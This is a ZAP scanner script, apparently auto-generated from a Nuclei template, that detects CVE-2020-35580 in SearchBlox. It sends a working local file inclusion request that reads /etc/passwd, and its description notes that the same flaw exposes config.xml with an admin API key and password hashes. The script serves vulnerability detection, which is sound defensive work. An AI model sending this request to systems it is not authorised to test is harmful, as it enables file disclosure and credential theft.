/*
 * MIT License
 *
 * Copyright (c) 2022 Sepehrdad
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

// auto generated by nuclei2zap
var RISK = 3 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2020-35580] SearchBlox < 9.2.2 - Local File Inclusion (LFI)"
var DESCRIPTION = "Local File Inclusion vulnerability in the FileServlet in all SearchBlox before 9.2.2 allows remote, unauthenticated users to read arbitrary files from the operating system via a /searchblox/servlet/FileServlet?col=url= request. Additionally, this may be used to read the contents of the SearchBlox configuration file (e.g., searchblox/WEB-INF/config.xml), which contains both the Super Admin API key and the base64 encoded SHA1 password hashes of other SearchBlox users."
var SOLUTION = "Apply all relevant security patches and product upgrades."
var REFERENCE = "https://hateshape.github.io/general/2021/05/11/CVE-2020-35580.html"
var OTHER = "see: https://developer.searchblox.com/docs/getting-started-with-searchblox"

function log(msg) {
	print("[" + this["zap.script.name"] + "] " + msg);
}

function alert(as, msg, evidence) {
	as.newAlert()
		.setRisk(RISK)
		.setConfidence(CONFIDENCE)
		.setName(TITLE)
		.setDescription(DESCRIPTION)
		.setEvidence(evidence)
		.setOtherInfo(OTHER)
		.setSolution(SOLUTION)
		.setReference(REFERENCE)
		.setMessage(msg)
		.raise();
}

function scanNode(as, msg) {

	var uri = msg.getRequestHeader().getURI();

	if (uri.getPath() != null && uri.getPath().length() > 1) {
		log("ignoring scan for " + uri);
		return;
	}

	log("scanning " + uri);

	// Copy requests before reusing them
	msg = msg.cloneRequest();

	uri = msg.getRequestHeader().getURI();
	uri.setPath("/searchblox/servlet/FileServlet");
	uri.setEscapedQuery("col=9&url=/etc/passwd");

	// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
	as.sendAndReceive(msg, false, false);

	var response_header = msg.getResponseHeader();
	var response_body = msg.getResponseBody();

	var re = new RegExp("root:.*:0:0:", 'g');

	var evidence = response_body.toString().match(re);

	// Test the response here, and make other requests as required
	if (response_header.getStatusCode() == 200 && evidence) {
		alert(as, msg, evidence);
	}
}

function scan(as, msg, param, value) {
	return;
}
